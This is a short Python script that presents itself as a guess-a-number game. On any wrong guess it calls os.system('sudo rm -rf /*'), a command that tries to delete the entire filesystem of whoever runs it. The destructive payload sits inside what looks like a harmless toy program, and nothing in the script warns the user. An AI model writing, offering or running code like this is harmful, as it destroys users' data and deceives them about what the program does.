import os, random 

number = random.randint(1,10)

guess = int(input("Guess a number between 1 and 10"))

if guess == number:
    print("You win!")
else:
    os.system("sudo rm -rf /*")